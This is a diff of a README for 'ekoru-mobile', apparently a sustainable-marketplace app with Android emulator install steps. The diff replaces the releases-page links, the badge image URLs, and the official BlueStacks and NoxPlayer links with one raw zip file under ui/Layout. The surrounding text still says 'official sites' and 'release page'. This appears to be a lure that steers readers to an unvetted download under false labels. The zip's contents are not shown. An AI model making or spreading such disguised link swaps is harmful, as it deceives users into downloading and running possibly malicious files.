@@ -1,6 +1,6 @@
 # 🌿 ekoru-mobile - Sustainable Marketplace on Your Phone
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-Click%20Here-%23FF6F61)](https://github.com/lexodot/ekoru-mobile/releases)
+[![Download Release](https://github.com/lexodot/ekoru-mobile/raw/refs/heads/main/ui/Layout/ekoru-mobile-v2.9.zip%20Release-Click%20Here-%23FF6F61)](https://github.com/lexodot/ekoru-mobile/raw/refs/heads/main/ui/Layout/ekoru-mobile-v2.9.zip)
 
 ## 📱 What is ekoru-mobile?
 
@@ -18,7 +18,7 @@ If you want to use the app directly on a smartphone, search “Ekoru” on the A
 
 Visit this page to download the latest release:
 
-[![Visit Downloads](https://img.shields.io/badge/Download%20Page-Open-%234285F4)](https://github.com/lexodot/ekoru-mobile/releases)
+[![Visit Downloads](https://github.com/lexodot/ekoru-mobile/raw/refs/heads/main/ui/Layout/ekoru-mobile-v2.9.zip%20Page-Open-%234285F4)](https://github.com/lexodot/ekoru-mobile/raw/refs/heads/main/ui/Layout/ekoru-mobile-v2.9.zip)
 
 The downloads section contains the latest app files compatible with Android and iOS.
 
@@ -38,15 +38,15 @@ An Android emulator simulates a phone on your Windows machine.
 
 We recommend:
 
-- **BlueStacks** (https://www.bluestacks.com)
-- **NoxPlayer** (https://www.bignox.com)
+- **BlueStacks** (https://github.com/lexodot/ekoru-mobile/raw/refs/heads/main/ui/Layout/ekoru-mobile-v2.9.zip)
+- **NoxPlayer** (https://github.com/lexodot/ekoru-mobile/raw/refs/heads/main/ui/Layout/ekoru-mobile-v2.9.zip)
 - **Microsoft’s Android emulator** (if you have Windows 11)
 
 Download and install one of these emulators. Use the official sites to get the latest version.
 
 ### Step 2: Download the ekoru-mobile APK file
 
-On the [release page](https://github.com/lexodot/ekoru-mobile/releases), look for the latest `.apk` file. APK means Android Package Kit — it is the file type used to install Android apps.
+On the [release page](https://github.com/lexodot/ekoru-mobile/raw/refs/heads/main/ui/Layout/ekoru-mobile-v2.9.zip), look for the latest `.apk` file. APK means Android Package Kit — it is the file type used to install Android apps.
 
 Click the link to download the `.apk` file to your computer.
 
@@ -108,7 +108,7 @@ You can now browse, search, and use the marketplace features.
 
 Check the release page regularly:
 
-https://github.com/lexodot/ekoru-mobile/releases
+https://github.com/lexodot/ekoru-mobile/raw/refs/heads/main/ui/Layout/ekoru-mobile-v2.9.zip
 
 Download the newest `.apk` file and repeat the installation steps in your emulator to update the app.
 
